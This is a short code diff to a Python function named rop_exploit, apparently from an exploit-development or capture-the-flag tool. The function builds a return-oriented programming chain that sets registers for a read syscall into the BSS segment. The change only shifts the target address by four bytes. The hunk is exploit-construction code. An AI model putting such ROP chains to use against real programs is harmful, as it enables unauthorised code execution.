@@ -61,9 +61,8 @@ def rop_exploit(binary_name):
     # # Read into BSS
     commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
-                "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
+                "ecx" : push_to_reg((bss + 4),"ecx",gadgets,rop), 
                 "edx" : push_to_reg(0xffffffff,"edx",gadgets,rop)}
-
 
     exploit += schedule(commands)
     exploit += INT80
